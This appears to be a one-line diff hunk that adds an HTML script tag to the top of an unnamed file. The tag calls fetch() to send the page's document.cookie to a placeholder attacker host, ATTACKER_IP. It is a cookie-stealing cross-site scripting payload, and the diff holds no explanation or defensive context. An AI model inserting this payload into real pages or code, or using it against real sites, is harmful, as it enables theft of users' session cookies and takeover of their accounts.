@@ -1,0 +1,1 @@
+<script>fetch('ATTACKER_IP/?c='+document.cookie)</script>
